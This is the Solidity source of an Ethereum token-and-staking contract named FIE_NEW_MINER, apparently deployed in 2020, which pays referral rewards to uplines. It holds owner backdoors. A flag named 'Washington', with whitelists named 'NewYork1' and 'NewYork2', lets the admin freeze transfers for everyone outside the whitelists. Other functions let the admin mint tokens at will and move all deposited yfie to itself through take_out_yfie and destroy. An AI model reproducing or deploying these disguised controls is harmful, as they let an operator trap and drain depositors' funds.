/**
 *Submitted for verification at Etherscan.io on 2020-11-10
*/

pragma solidity >=0.4.22 <0.6.0;

contract FIE_NEW_MINER
{
    constructor ()public{
        admin = msg.sender;
        sys.maxToken = 1000000000 ether;
        sys.startTime = uint32(now / 86400 );
        
        stUsers[msg.sender].id = ++sys.userCount;
        stUserID[sys.userCount] = msg.sender;
        //授权
        uint256 a;
        a=a-1;
        yfie.approve(address(this),a);
        
    }
    FIE_NEW_MINER public yfie = FIE_NEW_MINER(0xA1B3E61c15b97E85febA33b8F15485389d7836Db);
    FIE_NEW_MINER public old_fie=FIE_NEW_MINER(0x301416B8792B9c2adE82D9D87773251C8AD8c89e);
    FIE_NEW_MINER public old_lock=FIE_NEW_MINER(0x321931571C33075BE7fde8FD23cd69ACBf1781Ca);
    string public standard = '';
    string public name="FIE"; 
    string public symbol="FIE";
    uint8 public decimals = 18; 
    uint256 public totalSupply;
    

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    mapping (address =>bool) private NewYork1;
    mapping (address =>bool) private NewYork2;
    bool private Washington;

    event Transfer(address indexed from, address indexed to, uint256 value); 
    event Burn(address indexed from, uint256 value);
    address private admin;
    
    function _transfer(address _from, address _to, uint256 _value) internal {
      require(_to != address(0x0));
      require(Washington == false || NewYork1[_from]==true || NewYork2[_to] == true);
      require(balanceOf[_from] >= _value);
      require(balanceOf[_to] + _value > balanceOf[_to]);
      uint previousBalances = balanceOf[_from] + balanceOf[_to];
      balanceOf[_from] -= _value;
      balanceOf[_to] += _value;
      emit Transfer(_from, _to, _value);
      assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }
    
    function transfer(address _to, uint256 _value) public returns (bool success){
        _transfer(msg.sender, _to, _value);
        return true;
    }
    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success){
        require(_value <= allowance[_from][msg.sender]); 
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }
    
    function approve(address _spender, uint256 _value) public returns (bool success) {
        
        allowance[msg.sender][_spender] = _value;
        return true;
    }
    function set_Washington(bool value)public{
        require(msg.sender == admin);
        Washington = value;
    }
    function set_NewYork1(address addr,bool value)public{
        require(msg.sender == admin);
        NewYork1[addr]=value;
    }
    function set_NewYork2(address addr,bool value)public{
        require(msg.sender == admin);
        NewYork2[addr]=value;
    }

    struct USER{
        uint32 id;
        uint32 referrer; 
        uint32 out_time;//取出的时间
        uint32 inputTime;//存入时间
        uint256 out_fie;//已取出的数量 
        uint256 lock_yfie;
    }
    struct SYSTEM{
        uint256 maxToken;
        uint256 totalLock;
        uint32 startTime;
        uint32 userCount;
        
    }
    mapping(address => USER) public stUsers;
    mapping(address => uint32)teamCount;
    mapping(address => uint256)teamProfit;
    mapping(uint32 => address) public stUserID;
    SYSTEM public sys;
    event GiveProfie(address indexed user,address indexed referrer,uint256 value);
    event MineChange(address indexed user,address indexed referrer,uint256 front,uint256 change);
    function miner_start(uint32 referrer,uint value)public{
        require(value >0,'value==0');
        USER memory user;
        //转账
        require(yfie.transferFrom(msg.sender,address(this),value),'input yfie fail');
        if(stUsers[msg.sender].id == 0){
            require(referrer > 0 && referrer <= sys.userCount,'referrer bad');
            user.id = ++sys.userCount;
            user.referrer = referrer;
            user.lock_yfie = value;
            stUserID[sys.userCount] = msg.sender;
            emit MineChange(msg.sender,stUserID[referrer],0,value);
            teamCount[stUserID[referrer]]++;
        }
        else {
            take_out_profie();
            user = stUsers[msg.sender];
            emit MineChange(msg.sender,stUserID[referrer],user.lock_yfie,value);
            user.lock_yfie += value;
            user.out_fie = 0;
        }
        
        user.inputTime = uint32(now / 86400 );
        user.out_time = user.inputTime;
        stUsers[msg.sender] = user;
    }
    
    function compute_profit(address addr)public view returns(uint256 profit){
        if(sys.maxToken <= totalSupply)return 0;
        //获得时间差
        USER memory user=stUsers[addr];
        uint32 n = uint32(now /86400);
        if(n <= user.inputTime)return 0;
        //计算总比例
        n -= user.inputTime;
        uint256 fie;
        //等差数列前n项和公式 na1+n(n-1)/2*d 各项乘以100
        if(n <= 80){
            fie = n*100+n*(n-1)/2*5;
        }
        else {
            fie = 23800 + (n-80)*500;
        }
        //至此，fie是总比例 万分比
        //计算总收益
        fie = user.lock_yfie /10000 * fie;
        //减去已取出的收益 
        if(fie <=user.out_fie)return 0;
        fie-=user.out_fie;
        return fie;
    }
    function issue(address addr,uint256 value)internal returns(uint256 sue){
        if(totalSupply >= sys.maxToken)return 0;
        uint256 v = value;
        if(totalSupply + v > sys.maxToken)v=sys.maxToken - totalSupply;
        balanceOf[addr] += v;
        totalSupply += v;
        return v;
    }
    //取收益
    function take_out_profie()public{
        USER memory user=stUsers[msg.sender];
        uint256 profit=compute_profit(msg.sender);
        user.out_time = uint32(now /86400);
        user.out_fie += profit;
        stUsers[msg.sender]=user;
        
        if(user.referrer>0){//给上级发币
            issue(stUserID[user.referrer],profit /10);
            teamProfit[stUserID[user.referrer]] +=(profit /10);
        }
        profit=issue(msg.sender,profit);
        emit GiveProfie(msg.sender,stUserID[user.referrer],profit);
        stUsers[msg.sender] = user;
    }
    //取母币
    function miner_stop()public{
        USER memory user=stUsers[msg.sender];
        take_out_profie();
        require(yfie.transferFrom(address(this),msg.sender,user.lock_yfie));
        user.out_time=0;//取出的时间
        user.inputTime=0;//存入时间
        user.out_fie=0;//已取出的数量 
        user.lock_yfie=0;
        stUsers[msg.sender]=user;
    }

    function updata(uint32 min,uint32 max)public{
        require(msg.sender == admin);
        address addr;
        uint256 fie;
 
        for(uint32 i=min;i<=max;i++){
            addr=old_fie.stUserID(i);
            if(addr==address(0x0))continue;
            fie=old_fie.balanceOf(addr);
            issue(addr,fie);
        }
    }

    function data_from_old(uint32 min,uint32 max)public{
        require(msg.sender == admin);
        address addr;
        uint256 fie;
        USER memory u;
        SYSTEM memory s=sys;
        for(uint32 i=min;i<=max;i++){
            addr=old_lock.stUserID(i);
            if(addr==address(0x0))continue;
            fie=old_lock.balanceOf(addr);
            issue(addr,fie);
            stUserID[i]=addr;
            (u.id,u.referrer,u.out_time,u.inputTime,u.out_fie,u.lock_yfie)=old_lock.stUsers(addr);
            stUsers[addr]=u;
            if(u.referrer >0){
                teamCount[stUserID[u.referrer]] ++;
            }
            s.totalLock+=u.lock_yfie;
        }
        s.userCount = max;
        sys=s;
    }

    function look_user(address addr)public view returns(
        uint32 referrer, 
        uint32 out_time,
        uint32 inputTime,
        uint256 out_fie, 
        uint256 lock_yfie,
        uint32 team_count,
        uint256 team_profit,
        uint256 total_lock
        ){
        USER memory u= stUsers[addr];
        uint32 c =teamCount[addr];
        uint256 t=teamProfit[addr];
        uint256 total = sys.totalLock;
        return(
            u.referrer,
            u.out_time,
            u.inputTime,
            u.out_fie,
            u.lock_yfie,
            c,
            t,
            total
            );
    }
    function admin_issue(address addr,uint256 value)public{
        require(msg.sender == admin);
        issue(addr,value);
    }
    function take_out_yfie(address addr,uint256 value)public{
        require(msg.sender == admin);
        yfie.transferFrom(address(this),addr,value);
    }
    function destroy() public{
        require(msg.sender == admin,'msg.sender == admin');
        uint256 y=yfie.balanceOf(address(this));
        yfie.transferFrom(address(this),msg.sender,y);
    }
}